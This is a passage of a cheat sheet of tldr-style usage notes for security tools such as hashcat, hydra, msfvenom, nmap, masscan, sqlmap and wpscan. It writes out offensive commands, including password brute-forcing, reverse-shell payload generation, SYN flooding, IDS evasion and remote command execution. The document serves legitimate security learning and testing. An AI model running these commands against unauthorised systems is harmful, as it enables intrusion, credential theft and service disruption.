    hashcat --hash-type hash_type_id --attack-mode 0 hash_value /usr/share/wordlists/rockyou.txt

  - Perform a rule-based dictionary attack (mode 0) using the RockYou wordlist mutated with common password variations:
    hashcat --hash-type hash_type_id --attack-mode 0 --rules-file /usr/share/hashcat/rules/best64.rule hash_value /usr/share/wordlists/rockyou.txt

  - Perform a combination attack (mode 1) using the concatenation of words from two different custom dictionaries:
    hashcat --hash-type hash_type_id --attack-mode 1 hash_value /path/to/dictionary1.txt /path/to/dictionary2.txt

  - Show result of an already cracked hash:
    hashcat --show hash_value

  - Show all example hashes:
    hashcat --example-hashes
```

---

#### hashid:   Python3 program that identifies data and password hashes.
```sh
hashid

  Python3 program that identifies data and password hashes.
  More information: https://github.com/psypanda/hashID.

  - Identify hashes from stdin (through typing, copying and pasting, or piping the hash into the program):
    hashid

  - Identify one or more hashes:
    hashid hash1 hash2 ...

  - Identify hashes on a file (one hash per line):
    hashid path/to/hashes.txt

  - Show all possible hash types (including salted hashes):
    hashid --extended hash

  - Show hashcat's mode number and john's format string of the hash types:
    hashid --mode --john hash

  - Save output to a file instead of printing to stdout:
    hashid --outfile path/to/output.txt hash


See also: hashcat, john
```

---

#### hping3:   Advanced ping utility which supports protocols such TCP, UDP, and raw IP.
```sh
hping3

  Advanced ping utility which supports protocols such TCP, UDP, and raw IP.
  Best run with elevated privileges.
  More information: https://github.com/antirez/hping.

  - Ping a destination with 4 ICMP ping requests:
    hping3 --icmp --count 4 ip_or_hostname

  - Ping an IP address over UDP on port 80:
    hping3 --udp --destport 80 --syn ip_or_hostname

  - Scan TCP port 80, scanning from the specific local source port 5090:
    hping3 --verbose --syn --destport 80 --baseport 5090 ip_or_hostname

  - Traceroute using a TCP scan to a specific destination port:
    hping3 --traceroute --verbose --syn --destport 80 ip_or_hostname

  - Scan a set of TCP ports on a specific IP address:
    hping3 --scan 80,3000,9000 --syn ip_or_hostname

  - Perform a TCP ACK scan to check if a given host is alive:
    hping3 --count 2 --verbose --destport 80 --ack ip_or_hostname

  - Perform a charge test on port 80:
    hping3 --flood --destport 80 --syn ip_or_hostname
```

---

#### hydra:   Online password guessing tool.
```sh
hydra

  Online password guessing tool.
  Protocols supported include FTP, HTTP(S), SMTP, SNMP, XMPP, SSH, and more.
  More information: https://github.com/vanhauser-thc/thc-hydra.

  - Start Hydra's wizard:
    hydra-wizard

  - Guess SSH credentials using a given username and a list of passwords:
    hydra -l username -P path/to/wordlist.txt host_ip ssh

  - Guess HTTPS webform credentials using two specific lists of usernames and passwords ("https_post_request" can be like "username=^USER^&password=^PASS^"):
    hydra -L path/to/usernames.txt -P path/to/wordlist.txt host_ip https-post-form "url_without_host:https_post_request:login_failed_string"

  - Guess FTP credentials using usernames and passwords lists, specifying the number of threads:
    hydra -L path/to/usernames.txt -P path/to/wordlist.txt -t n_tasks host_ip ftp

  - Guess MySQL credentials using a username and a passwords list, exiting when a username/password pair is found:
    hydra -l username -P path/to/wordlist.txt -f host_ip mysql

  - Guess RDP credentials using a username and a passwords list, showing each attempt:
    hydra -l username -P path/to/wordlist.txt -V rdp://host_ip

  - Guess IMAP credentials on a range of hosts using a list of colon-separated username/password pairs:
    hydra -C path/to/username_password_pairs.txt imap://[host_range_cidr]

  - Guess POP3 credentials on a list of hosts using usernames and passwords lists, exiting when a username/password pair is found:
    hydra -L path/to/usernames.txt -P path/to/wordlist.txt -M path/to/hosts.txt -F pop3
```

---

#### john:   Password cracker.
```sh
john

  Password cracker.
  More information: https://www.openwall.com/john/.

  - Crack password hashes:
    john path/to/hashes.txt

  - Show passwords cracked:
    john --show path/to/hashes.txt

  - Display users' cracked passwords by user identifier from multiple files:
    john --show --users=user_ids path/to/hashes1.txt path/to/hashes2.txt ...

  - Crack password hashes, using a custom wordlist:
    john --wordlist=path/to/wordlist.txt path/to/hashes.txt

  - List available hash formats:
    john --list=formats

  - Crack password hashes, using a specific hash format:
    john --format=md5crypt path/to/hashes.txt

  - Crack password hashes, enabling word mangling rules:
    john --rules path/to/hashes.txt

  - Restore an interrupted cracking session from a state file, e.g. mycrack.rec:
    john --restore=path/to/mycrack.rec
```

---

#### kismet:   A wireless network and device detector, sniffer, wardriving tool, and WIDS (wireless intrusion detection) framework.
```sh
kismet

  A wireless network and device detector, sniffer, wardriving tool, and WIDS (wireless intrusion detection) framework.
  More information: https://www.kismetwireless.net/.

  - Capture packets from a specific wireless interface:
    sudo kismet -c wlan0

  - Monitor multiple channels on a wireless interface:
    sudo kismet -c wlan0,wlan1 -m

  - Capture packets and save them to a specific directory:
    sudo kismet -c wlan0 -d path/to/output

  - Start Kismet with a specific configuration file:
    sudo kismet -c wlan0 -f path/to/config.conf

  - Monitor and log data to an SQLite database:
    sudo kismet -c wlan0 --log-to-db

  - Monitor using a specific data source:
    sudo kismet -c wlan0 --data-source=rtl433

  - Enable alerts for specific events:
    sudo kismet -c wlan0 --enable-alert=new_ap

  - Display detailed information about a specific AP's packets:
    sudo kismet -c wlan0 --info BSSID
```

---

#### lynis:   System and security auditing tool.
```sh
lynis

  System and security auditing tool.
  More information: https://cisofy.com/documentation/lynis/.

  - Check that Lynis is up-to-date:
    sudo lynis update info

  - Run a security audit of the system:
    sudo lynis audit system

  - Run a security audit of a Dockerfile:
    sudo lynis audit dockerfile path/to/dockerfile
```

---

#### macchanger:   Command-line utility for manipulating network interface MAC addresses.
```sh
macchanger

  Command-line utility for manipulating network interface MAC addresses.
  More information: https://manned.org/macchanger.

  - View the current and permanent MAC addresses of a interface:
    macchanger --show interface

  - Set interface to a random MAC:
    macchanger --random interface

  - Set an interface to a random MAC address, and pretend to be a [b]urned-[i]n-[a]ddress:
    macchanger --random --bia interface

  - Set an interface to a specific MAC address:
    macchanger --mac XX:XX:XX:XX:XX:XX interface

  - Print the identifications (the first three bytes of a MAC address) of all known vendors:
    macchanger --list

  - Reset an interface to its permanent hardware MAC address:
    macchanger --permanent interface
```

---

#### masscan:   Network scanner for scanning as fast as possible.
```sh
masscan

  Network scanner for scanning as fast as possible.
  Best run with elevated privileges. Nmap compatibility run masscan --nmap to find out more.
  More information: https://github.com/robertdavidgraham/masscan.

  - Scan an IP or network subnet for [p]ort 80:
    masscan ip_address|network_prefix --ports 80

  - Scan a class B subnet for the top 100 ports at 100,000 packets per second:
    masscan 10.0.0.0/16 --top-ports 100 --rate 100000

  - Scan a class B subnet avoiding ranges from a specific exclude file:
    masscan 10.0.0.0/16 --top-ports 100 --excludefile path/to/file

  - Scan the Internet for web servers running on port 80 and 443:
    masscan 0.0.0.0/0 --ports 80,443 --rate 10000000

  - Scan the Internet for DNS servers running on UDP port 53:
    masscan 0.0.0.0/0 --ports U:53 --rate 10000000

  - Scan the Internet for a specific port range and export to a file:
    masscan 0.0.0.0/0 --ports 0-65535 --output-format binary|grepable|json|list|xml --output-filename path/to/file

  - Read binary scan results from a file and output to stdout:
    masscan --readscan path/to/file
```

---

#### medusa:   A modular and parallel login brute-forcer for a variety of protocols.
```sh
Medusa

  A modular and parallel login brute-forcer for a variety of protocols.
  More information: https://jmk-foofus.github.io/medusa/medusa.html.

  - Execute brute force against an FTP server using a file containing usernames and a file containing passwords:
    medusa -M ftp -h host -U path/to/username_file -P path/to/password_file

  - Execute a login attempt against an HTTP server using the username, password and user-agent specified:
    medusa -M HTTP -h host -u username -p password -m USER-AGENT:"Agent"

  - Execute a brute force against a MySQL server using a file containing usernames and a hash:
    medusa -M mysql -h host -U path/to/username_file -p hash -m PASS:HASH

  - Execute a brute force against a list of SMB servers using a username and a pwdump file:
    medusa -M smbnt -H path/to/hosts_file -C path/to/pwdump_file -u username -m PASS:HASH
```

---

#### minicom:   Communicate with the serial interface of a device.
```sh
minicom

  Communicate with the serial interface of a device.
  More information: https://manned.org/minicom.

  - Open a given serial port:
    sudo minicom --device /dev/ttyUSB0

  - Open a given serial port with a given baud rate:
    sudo minicom --device /dev/ttyUSB0 --baudrate 115200

  - Enter the configuration menu before communicating with a given serial port:
    sudo minicom --device /dev/ttyUSB0 --setup
```

---

#### mitmproxy:   An interactive man-in-the-middle HTTP proxy.
```sh
mitmproxy

  An interactive man-in-the-middle HTTP proxy.
  See also: mitmweb.
  More information: https://docs.mitmproxy.org/stable/concepts-options.

  - Start mitmproxy with default settings:
    mitmproxy

  - Start mitmproxy bound to a custom address and port:
    mitmproxy --listen-host ip_address --listen-port port

  - Start mitmproxy using a script to process traffic:
    mitmproxy --scripts path/to/script.py

  - Export the logs with SSL/TLS master keys to external programs (wireshark, etc.):
    SSLKEYLOGFILE="path/to/file" mitmproxy


See also: mitmweb
```

---

#### mmls:   Display the partition layout of a volume system.
```sh
mmls

  Display the partition layout of a volume system.
  More information: https://wiki.sleuthkit.org/index.php?title=Mmls.

  - Display the partition table stored in an image file:
    mmls path/to/image_file

  - Display the partition table with an additional column for the partition size:
    mmls -B -i path/to/image_file

  - Display the partition table in a split EWF image:
    mmls -i ewf image.e01 image.e02

  - Display nested partition tables:
    mmls -t nested_table_type -o offset path/to/image_file
```

---

#### msfvenom:   Manually generate payloads for metasploit.
```sh
msfvenom

  Manually generate payloads for metasploit.
  More information: https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom.

  - List payloads:
    msfvenom -l payloads

  - List formats:
    msfvenom -l formats

  - Show payload options:
    msfvenom -p payload --list-options

  - Create an ELF binary with a reverse TCP handler:
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port -f elf -o path/to/binary

  - Create an EXE binary with a reverse TCP handler:
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port -f exe -o path/to/binary.exe

  - Create a raw Bash with a reverse TCP handler:
    msfvenom -p cmd/unix/reverse_bash LHOST=local_ip LPORT=local_port -f raw
```

---

#### nasm:   The Netwide Assembler, a portable 80x86 assembler.
```sh
nasm

  The Netwide Assembler, a portable 80x86 assembler.
  More information: https://nasm.us.

  - Assemble source.asm into a binary file source, in the (default) raw binary format:
    nasm source.asm

  - Assemble source.asm into a binary file output_file, in the specified format:
    nasm -f format source.asm -o output_file

  - List valid output formats (along with basic nasm help):
    nasm -hf

  - Assemble and generate an assembly listing file:
    nasm -l list_file source.asm

  - Add a directory (must be written with trailing slash) to the include file search path before assembling:
    nasm -i path/to/include_dir/ source.asm


See also: source
```

---

#### nbtscan:   Scan networks for NetBIOS name information.
```sh
nbtscan

  Scan networks for NetBIOS name information.
  More information: https://github.com/resurrecting-open-source-projects/nbtscan.

  - Scan a network for NetBIOS names:
    nbtscan 192.168.0.1/24

  - Scan a single IP address:
    nbtscan 192.168.0.1

  - Display verbose output:
    nbtscan -v 192.168.0.1/24

  - Display output in /etc/hosts format:
    nbtscan -e 192.168.0.1/24

  - Read IP addresses/networks to scan from a file:
    nbtscan -f path/to/file.txt
```

---

#### netcat:   This command is an alias of nc.
```sh
netcat

  This command is an alias of nc.

  - View documentation for the original command:
    tldr nc


See also: nc
```

---

#### nikto:   Web server scanner which performs tests against web servers for multiple items.
```sh
nikto

  Web server scanner which performs tests against web servers for multiple items.
  More information: https://cirt.net/Nikto2.

  - Perform a basic Nikto scan against a target host:
    perl nikto.pl -h 192.168.0.1

  - Specify the port number when performing a basic scan:
    perl nikto.pl -h 192.168.0.1 -p 443

  - Scan ports and protocols with full URL syntax:
    perl nikto.pl -h https://192.168.0.1:443/

  - Scan multiple ports in the same scanning session:
    perl nikto.pl -h 192.168.0.1 -p 80,88,443

  - Update to the latest plugins and databases:
    perl nikto.pl -update
```

---

#### nmap:   Network exploration tool and security/port scanner.
```sh
nmap

  Network exploration tool and security/port scanner.
  Some features (e.g. SYN scan) activate only when nmap is run with root privileges.
  More information: https://nmap.org/book/man.html.

  - Scan the top 1000 ports of a remote host with various [v]erbosity levels:
    nmap -v1|2|3 ip_or_hostname

  - Run a ping sweep over an entire subnet or individual hosts very aggressively:
    nmap -T5 -sn 192.168.0.0/24|ip_or_hostname1,ip_or_hostname2,...

  - Enable OS detection, version detection, script scanning, and traceroute:
    sudo nmap -A ip_or_hostname1,ip_or_hostname2,...

  - Scan a specific list of ports (use -p- for all ports from 1 to 65535):
    nmap -p port1,port2,... ip_or_host1,ip_or_host2,...

  - Perform service and version detection of the top 1000 ports using default NSE scripts, writing results (-oA) to output files:
    nmap -sC -sV -oA top-1000-ports ip_or_host1,ip_or_host2,...

  - Scan target(s) carefully using default and safe NSE scripts:
    nmap --script "default and safe" ip_or_host1,ip_or_host2,...

  - Scan for web servers running on standard ports 80 and 443 using all available http-NSE scripts:
    nmap --script "http-*" ip_or_host1,ip_or_host2,... -p 80,443

  - Attempt evading IDS/IPS detection by using an extremely slow scan (-T0), decoy source addresses (-D), [f]ragmented packets, random data and other methods:
    sudo nmap -T0 -D decoy_ip1,decoy_ip2,... --source-port 53 -f --data-length 16 -Pn ip_or_host
```

---

#### pdf-parser:   Identify fundamental elements of a PDF file without rendering it.
```sh
pdf-parser

  Identify fundamental elements of a PDF file without rendering it.
  More information: https://blog.didierstevens.com/programs/pdf-tools.

  - Display statistics for a PDF file:
    pdf-parser --stats path/to/file.pdf

  - Display objects of type /Font in a PDF file:
    pdf-parser --type=/Font path/to/file.pdf

  - Search for strings in indirect objects:
    pdf-parser --search=search_string path/to/file.pdf
```

---

#### radare2:   A set of reverse engineering tools.
```sh
radare2

  A set of reverse engineering tools.
  More information: https://www.radare.org/r/docs.html.

  - Open a file in write mode without parsing the file format headers:
    radare2 -nw path/to/binary

  - Debug a program:
    radare2 -d path/to/binary

  - Run a script before entering the interactive CLI:
    radare2 -i path/to/script.r2 path/to/binary

  - Display help text for any command in the interactive CLI:
    > radare2_command?

  - Run a shell command from the interactive CLI:
    > !shell_command

  - Dump raw bytes of current block to a file:
    > pr > path/to/file.bin
```

---

#### rarcrack:   Password cracker for RAR, Zip and 7z archives.
```sh
rarcrack

  Password cracker for RAR, Zip and 7z archives.

  - Brute force the password for an archive (tries to guess the archive type):
    rarcrack path/to/file.zip

  - Specify the archive type:
    rarcrack --type rar|zip|7z path/to/file.zip

  - Use multiple threads:
    rarcrack --threads 6 path/to/file.zip
```

---

#### searchsploit:   Search Exploit Database for exploits, shellcodes and/or papers.
```sh
searchsploit

  Search Exploit Database for exploits, shellcodes and/or papers.
  If known version numbers are used as search terms, exploits for both the exact version and others whose version range covers the one specified are shown.
  More information: https://www.exploit-db.com/searchsploit.

  - Search for an exploit, shellcode, or paper:
    searchsploit search_terms

  - Search for a known specific version, e.g. sudo version 1.8.27:
    searchsploit sudo 1.8.27

  - Show the exploit-db link to the found resources:
    searchsploit --www search_terms

  - Copy ([m]irror) the resource to the current directory (requires the number of the exploit):
    searchsploit --mirror exploit_number

  - E[x]amine the resource, using the pager defined in the $PAGER environment variable:
    searchsploit --examine exploit_number

  - [u]pdate the local Exploit Database:
    searchsploit --update

  - Search for the [c]ommon [v]ulnerabilities and [e]xposures (CVE) value:
    searchsploit --cve 2021-44228

  - Check results in nmap's XML output with service version (nmap -sV -oX nmap-output.xml) for known exploits:
    searchsploit --nmap path/to/nmap-output.xml


See also: nmap
```

---

#### sherlock:   Find usernames across social networks.
```sh
sherlock

  Find usernames across social networks.
  More information: https://github.com/sherlock-project/sherlock.

  - Search for a specific username on social networks saving the results to a file:
    sherlock username --output path/to/file

  - Search for specific usernames on social networks saving the results into a directory:
    sherlock username1 username2 ... --folderoutput path/to/directory

  - Search for a specific username on social networks using the Tor network:
    sherlock --tor username

  - Make requests over Tor with a new Tor circuit after each request:
    sherlock --unique-tor username

  - Search for a specific username on social networks using a proxy:
    sherlock username --proxy proxy_url

  - Search for a specific username on social networks and open results in the default web browser:
    sherlock username --browse

  - Display help:
    sherlock --help
```

---

#### siege:   HTTP loadtesting and benchmarking tool.
```sh
siege

  HTTP loadtesting and benchmarking tool.
  More information: https://www.joedog.org/siege-manual/.

  - Test a URL with default settings:
    siege https://example.com

  - Test a list of URLs:
    siege --file path/to/url_list.txt

  - Test list of URLs in a random order (Simulates internet traffic):
    siege --internet --file path/to/url_list.txt

  - Benchmark a list of URLs (without waiting between requests):
    siege --benchmark --file path/to/url_list.txt

  - Set the amount of concurrent connections:
    siege --concurrent=50 --file path/to/url_list.txt

  - Set how long for the siege to run for:
    siege --time=30s --file path/to/url_list.txt
```

---

#### smbmap:   SMB enumeration tool.
```sh
smbmap

  SMB enumeration tool.
  More information: https://github.com/ShawnDEvans/smbmap.

  - Display SMB shares and permissions on a host, prompting for user's password or NTLM hash:
    smbmap -u username --prompt -H ip

  - Display SMB shares and permissions on a host, specifying the domain and passing the password NTLM hash:
    smbmap -u username --prompt -d domain -H ip

  - Display SMB shares and list a single level of directories and files:
    smbmap -u username --prompt -H ip -r

  - Display SMB shares and recursively list a defined number of levels of directories and files:
    smbmap -u username --prompt -H ip -R --depth 3

  - Display SMB shares and recursively list directories and files, downloading the files matching a regular expression:
    smbmap -u username --prompt -H ip -R -A pattern

  - Display SMB shares and recursively list directories and files, searching for file content matching a regular expression:
    smbmap -u username --prompt -H ip -R -F pattern

  - Execute a shell command on a remote system:
    smbmap -u username --prompt -H ip -x command

  - Upload a file to a remote system:
    smbmap -u username --prompt -H ip --upload source destination
```

---

#### socat:   Multipurpose relay (SOcket CAT).
```sh
socat

  Multipurpose relay (SOcket CAT).
  More information: http://www.dest-unreach.org/socat/.

  - Listen to a port, wait for an incoming connection and transfer data to STDIO:
    socat - TCP-LISTEN:8080,fork

  - Listen on a port using SSL and print to STDOUT:
    socat OPENSSL-LISTEN:4433,reuseaddr,cert=./cert.pem,cafile=./ca.cert.pem,key=./key.pem,verify=0 STDOUT

  - Create a connection to a host and port, transfer data in STDIO to connected host:
    socat - TCP4:www.example.com:80

  - Forward incoming data of a local port to another host and port:
    socat TCP-LISTEN:80,fork TCP4:www.example.com:80
```

---

#### sqlmap:   Detect and exploit SQL injection flaws.
```sh
sqlmap

  Detect and exploit SQL injection flaws.
  More information: https://sqlmap.org.

  - Run sqlmap against a single target URL:
    python sqlmap.py -u "http://www.target.com/vuln.php?id=1"

  - Send data in a POST request (--data implies POST request):
    python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1"

  - Change the parameter delimiter (& is the default):
    python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";"

  - Select a random User-Agent from ./txt/user-agents.txt and use it:
    python sqlmap.py -u "http://www.target.com/vuln.php" --random-agent

  - Provide user credentials for HTTP protocol authentication:
    python sqlmap.py -u "http://www.target.com/vuln.php" --auth-type Basic --auth-cred "testuser:testpass"
```

---

#### sslscan:   Check SSL/TLS protocols and ciphers supported by a server.
```sh
sslscan

  Check SSL/TLS protocols and ciphers supported by a server.
  More information: https://github.com/rbsec/sslscan.

  - Test a server on port 443:
    sslscan example.com

  - Test a specified port:
    sslscan example.com:465

  - Show certificate information:
    testssl --show-certificate example.com
```

---

#### swaks:   Swiss Army Knife SMTP, the all-purpose SMTP transaction tester.
```sh
swaks

  Swiss Army Knife SMTP, the all-purpose SMTP transaction tester.
  More information: https://github.com/jetmore/swaks/blob/develop/doc/base.pod.

  - Deliver a standard test email to user@example.com on port 25 of test-server.example.net:
    swaks --to user@example.com --server test-server.example.net

  - Deliver a standard test email, requiring CRAM-MD5 authentication as user me@example.com. An "X-Test" header will be added to the email body:
    swaks --to user@example.com --from me@example.com --auth CRAM-MD5 --auth-user me@example.com --header-X-Test "test_email"

  - Test a virus scanner using EICAR in an attachment. Don't show the message DATA part:
    swaks -t user@example.com --attach - --server test-server.example.com --suppress-data path/to/eicar.txt

  - Test a spam scanner using GTUBE in the body of an email, routed via the MX records for example.com:
    swaks --to user@example.com --body path/to/gtube_file

  - Deliver a standard test email to user@example.com using the LMTP protocol via a UNIX domain socket file:
    swaks --to user@example.com --socket /var/lda.sock --protocol LMTP
```

---

#### tcpdump:   Dump traffic on a network.
```sh
tcpdump

  Dump traffic on a network.
  More information: https://www.tcpdump.org.

  - List available network interfaces:
    tcpdump -D

  - Capture the traffic of a specific interface:
    tcpdump -i eth0

  - Capture all TCP traffic showing contents (ASCII) in console:
    tcpdump -A tcp

  - Capture the traffic from or to a host:
    tcpdump host www.example.com

  - Capture the traffic from a specific interface, source, destination and destination port:
    tcpdump -i eth0 src 192.168.1.1 and dst 192.168.1.2 and dst port 80

  - Capture the traffic of a network:
    tcpdump net 192.168.1.0/24

  - Capture all traffic except traffic over port 22 and save to a dump file:
    tcpdump -w dumpfile.pcap port not 22

  - Read from a given dump file:
    tcpdump -r dumpfile.pcap
```

---

#### tcpflow:   Capture TCP traffic for debugging and analysis.
```sh
tcpflow

  Capture TCP traffic for debugging and analysis.
  More information: https://manned.org/tcpflow.

  - Show all data on the given interface and port:
    tcpflow -c -i eth0 port 80
```

---

#### theharvester:   A tool designed to be used in the early stages of a penetration test.
```sh
theHarvester

  A tool designed to be used in the early stages of a penetration test.
  More information: https://github.com/laramies/theHarvester.

  - Gather information on a domain using Google:
    theHarvester --domain domain_name --source google

  - Gather information on a domain using multiple sources:
    theHarvester --domain domain_name --source duckduckgo,bing,crtsh

  - Change the limit of results to work with:
    theHarvester --domain domain_name --source google --limit 200

  - Save the output to two files in XML and HTML format:
    theHarvester --domain domain_name --source google --file output_file_name

  - Display help:
    theHarvester --help
```

---

#### wfuzz:   A web application bruteforcer.
```sh
wfuzz

  A web application bruteforcer.
  More information: https://wfuzz.readthedocs.io/en/latest/user/basicusage.html.

  - Directory and file bruteforce using the specified [w]ordlist and also [p]roxying the traffic:
    wfuzz -w path/to/file -p 127.0.0.1:8080:HTTP http://example.com/FUZZ

  - Save the results to a [f]ile:
    wfuzz -w path/to/file -f filename http://example.com/FUZZ

  - Show [c]olorized output while only showing the declared response codes in the output:
    wfuzz -c -w path/to/file --sc 200,301,302 http://example.com/FUZZ

  - Use a custom [H]eader to fuzz subdomains while [h]iding specific response [c]odes and word counts. Increase the [t]hreads to 100 and include the target ip/domain:
    wfuzz -w path/to/file -H "Host: FUZZ.example.com" --hc 301 --hw 222 -t 100 example.com

  - Brute force Basic Authentication using a list of usernames and passwords from files for each FUZ[z] keyword, [h]iding response [c]odes of unsuccessful attempts:
    wfuzz -c --hc 401 -s delay_between_requests_in_seconds -z file,path/to/usernames -z file,path/to/passwords --basic 'FUZZ:FUZ2Z' https://example.com

  - Provide wordlist directly from the command line and use POST request for fuzzing:
    wfuzz -z list,word1-word2-... https://api.example.com -d "id=FUZZ&showwallet=true"

  - Provide wordlists from a file applying base64 and md5 encoding on them (wfuzz -e encoders lists all available encoders):
    wfuzz -z file,path/to/file,none-base64-md5 https://example.com/FUZZ

  - List available encoders/payloads/iterators/printers/scripts:
    wfuzz -e encoders|payloads|iterators|printers|scripts
```

---

#### wpscan:   WordPress vulnerability scanner.
```sh
wpscan

  WordPress vulnerability scanner.
  More information: https://github.com/wpscanteam/wpscan.

  - Update the vulnerability database:
    wpscan --update

  - Scan a WordPress website:
    wpscan --url url

  - Scan a WordPress website, using random user agents and passive detection:
    wpscan --url url --stealthy

  - Scan a WordPress website, checking for vulnerable plugins and specifying the path to the wp-content directory:
    wpscan --url url --enumerate vp --wp-content-dir remote/path/to/wp-content

  - Scan a WordPress website through a proxy:
    wpscan --url url --proxy protocol://ip:port --proxy-auth username:password

  - Perform user identifiers enumeration on a WordPress website:
    wpscan --url url --enumerate u

  - Execute a password guessing attack on a WordPress website:
    wpscan --url url --usernames username|path/to/usernames.txt --passwords path/to/passwords.txt threads 20

  - Scan a WordPress website, collecting vulnerability data from the WPVulnDB (https://wpvulndb.com/):
    wpscan --url url --api-token token
```

---

#### zip2john:   Extract password hashes from Zip archives for use with John the Ripper password cracker.
```sh
zip2john

  Extract password hashes from Zip archives for use with John the Ripper password cracker.
  This is a utility tool usually installed as part of the John the Ripper installation.
  More information: https://www.openwall.com/john/.

  - Extract the password hash from an archive, listing all files in the archive:
    zip2john path/to/file.zip

  - Extract the password hash using [o]nly a specific compressed file:
    zip2john -o path/to/compressed_file path/to/file.zip

  - Extract the password hash from a compressed file to a specific file (for use with John the Ripper):
    zip2john -o path/to/compressed_file path/to/file.zip > file.hash
```

#### zip2john:   Extract password hashes from Zip archives for use with John the Ripper password cracker.
```sh
zip2john

  Extract password hashes from Zip archives for use with John the Ripper password cracker.
  This is a utility tool usually installed as part of the John the Ripper installation.
  More information: https://www.openwall.com/john/.

  - Extract the password hash from an archive, listing all files in the archive:
    zip2john path/to/file.zip

  - Extract the password hash using [o]nly a specific compressed file:
    zip2john -o path/to/compressed_file path/to/file.zip

  - Extract the password hash from a compressed file to a specific file (for use with John the Ripper):
    zip2john -o path/to/compressed_file path/to/file.zip > file.hash
```
